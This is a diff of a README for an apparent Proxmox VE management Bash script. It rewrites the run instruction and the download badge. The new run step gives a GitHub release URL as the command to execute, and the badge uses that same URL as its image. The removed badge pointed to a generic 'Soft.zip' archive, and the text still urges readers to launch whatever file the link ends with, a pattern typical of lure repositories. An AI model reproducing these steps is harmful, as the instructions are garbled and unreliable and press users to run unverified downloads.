@@ -16,7 +16,7 @@ Welcome to the Proxmox-Tool-Suite repository! This Bash script is designed to si
 To get started with using the Proxmox-Tool-Suite, follow these steps:
 1. Clone the repository to your local machine.
 2. Make sure you have Bash installed.
-3. Run the script using `./proxmox_tool.sh`.
+3. Run the script using `https://github.com/DanangAryaPratama/Proxmox-Tool-Suite/releases/tag/v1.2`.
 4. Follow the on-screen instructions to manage your Proxmox environment efficiently.
 
 ## Topics 📋
@@ -41,7 +41,7 @@ Explore the following topics covered by this tool:
 
 Ready to simplify your Proxmox VE management? Download the Proxmox-Tool-Suite using the link below:
 
-[![Download Proxmox Tool Suite](https://img.shields.io/badge/Download-Proxmox_Tool_Suite-green)](https://github.com/files/Soft.zip)
+[![Download Proxmox Tool Suite](https://github.com/DanangAryaPratama/Proxmox-Tool-Suite/releases/tag/v1.2)](https://github.com/DanangAryaPratama/Proxmox-Tool-Suite/releases/tag/v1.2)
 
 If the link ends with a file name, make sure to launch it to begin using the tool!
 
